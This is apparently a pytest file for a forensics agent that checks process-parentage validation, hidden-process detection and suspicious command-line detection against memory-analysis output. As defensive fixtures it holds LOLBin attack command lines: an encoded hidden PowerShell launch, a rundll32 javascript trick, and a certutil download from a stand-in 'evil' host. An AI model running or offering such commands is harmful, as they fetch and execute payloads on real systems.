"""Phase 2 additions: windows.pstree parent-child validation + suspicious
command-line detection. Fixtures mirror the xp-tdungan masquerade (svchost PID
3296 under explorer 1900) and a hidden spinlock process."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from dfir_agent.rules.suspicious_process import (  # noqa: E402
    detect_hidden_processes,
    detect_parent_anomalies,
    detect_suspicious_command_lines,
    validate_parentage_with_pstree,
)
from dfir_agent.scoring import correlate_findings  # noqa: E402
from dfir_agent.state import Confidence  # noqa: E402


def _counter(start=0):
    n = {"i": start}

    def nxt():
        n["i"] += 1
        return f"F-{n['i']:04d}"

    return nxt


PSLIST = [
    {"PID": 1044, "PPID": 1000, "ImageFileName": "services.exe"},
    {"PID": 1900, "PPID": 2436, "ImageFileName": "explorer.exe"},
    {"PID": 3296, "PPID": 1900, "ImageFileName": "svchost.exe"},  # masquerade: parent=explorer
]
# pstree agrees: 3296 is a child of explorer (1900) — corroborates the anomaly.
PSTREE = [
    {"PID": 1900, "PPID": 2436, "ImageFileName": "explorer.exe"},
    {"PID": 3296, "PPID": 1900, "ImageFileName": "* svchost.exe"},
]
PSSCAN = [
    {"PID": 12244, "PPID": 5872, "ImageFileName": "spinlock.exe", "ExitTime": None},  # hidden
]


def test_pstree_corroborates_parent_anomaly_same_family_no_inflation():
    findings = detect_parent_anomalies(
        PSLIST, host_id="h", provenance_id="cmd-pslist", artifact_path=None, next_id=_counter()
    )
    assert len(findings) == 1 and findings[0].entity_key == "pid:3296"

    n = validate_parentage_with_pstree(
        findings, PSTREE, PSLIST, provenance_id="cmd-pstree", artifact_path=None
    )
    assert n == 1
    f = findings[0]
    # A pstree (process_tree) reference was attached with the pstree provenance...
    assert any(e.provenance_id == "cmd-pstree" and e.source_family == "process_tree" for e in f.evidence)
    assert "pstree_corroborated" in f.tags
    # ...but it's the SAME family, so the merged finding stays single-family (suspicious),
    # NOT auto-confirmed from two correlated process plugins.
    merged = correlate_findings(findings)
    assert merged[0].confidence == Confidence.suspicious


def test_pstree_flags_parent_mismatch_as_contradiction():
    findings = detect_parent_anomalies(
        PSLIST, host_id="h", provenance_id="cmd-pslist", artifact_path=None, next_id=_counter()
    )
    # pstree DISAGREES: it shows 3296's parent as services.exe (1044), not explorer.
    pstree_conflict = [
        {"PID": 1044, "PPID": 1000, "ImageFileName": "services.exe"},
        {"PID": 3296, "PPID": 1044, "ImageFileName": "svchost.exe"},
    ]
    validate_parentage_with_pstree(
        findings, pstree_conflict, PSLIST, provenance_id="cmd-pstree", artifact_path=None
    )
    assert "pstree_parent_mismatch" in findings[0].tags


def test_pstree_corroborates_hidden_process_by_absence():
    findings = detect_hidden_processes(
        PSSCAN, [], host_id="h", provenance_id="cmd-psscan", artifact_path=None, next_id=_counter()
    )
    assert len(findings) == 1 and findings[0].category == "hidden_process"
    # pstree (active list) does NOT contain PID 12244 -> corroborates unlinking.
    n = validate_parentage_with_pstree(
        findings, PSTREE, [], provenance_id="cmd-pstree", artifact_path=None
    )
    assert n == 1
    assert "pstree_corroborated" in findings[0].tags
    assert any("absent from the active process tree" in (e.note or "") for e in findings[0].evidence)


CMDLINE_SUSP = [
    {"PID": 100, "Process": "powershell.exe",
     "Args": "powershell -nop -w hidden -enc SQBFAFgA"},
    {"PID": 101, "Process": "rundll32.exe",
     "Args": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()'},
    {"PID": 102, "Process": "certutil.exe",
     "Args": "certutil -urlcache -split -f http://evil/x.exe x.exe"},
    # benign — must NOT flag
    {"PID": 103, "Process": "svchost.exe", "Args": '"C:\\WINDOWS\\system32\\svchost.exe" -k netsvcs'},
    {"PID": 104, "Process": "powershell.exe", "Args": "powershell Get-Process"},
]


def test_suspicious_command_lines_flags_lolbins_only():
    f = detect_suspicious_command_lines(
        CMDLINE_SUSP, host_id="h", provenance_id="cmd-cl", artifact_path=None, next_id=_counter()
    )
    flagged = sorted(int(x.entity_key.split(":")[1]) for x in f)
    assert flagged == [100, 101, 102]  # encoded PS, rundll32 script, certutil download
    assert all(x.evidence[0].source_family == "command_line" for x in f)
    assert all(x.confidence == Confidence.suspicious for x in f)


def test_suspicious_cmdline_merges_with_masquerade_to_confirm():
    # A process that is BOTH masqueraded (process_tree) AND launched with an encoded
    # command line (command_line) -> two DISTINCT families -> confirmed.
    masq = detect_parent_anomalies(
        PSLIST, host_id="h", provenance_id="cmd-pslist", artifact_path=None, next_id=_counter(0)
    )
    cl = detect_suspicious_command_lines(
        [{"PID": 3296, "Process": "svchost.exe", "Args": "powershell -enc ZQB2AGkAbAA="}],
        host_id="h", provenance_id="cmd-cl", artifact_path=None, next_id=_counter(50),
    )
    merged = correlate_findings(masq + cl)
    target = [m for m in merged if m.entity_key == "pid:3296"][0]
    assert target.confidence == Confidence.confirmed
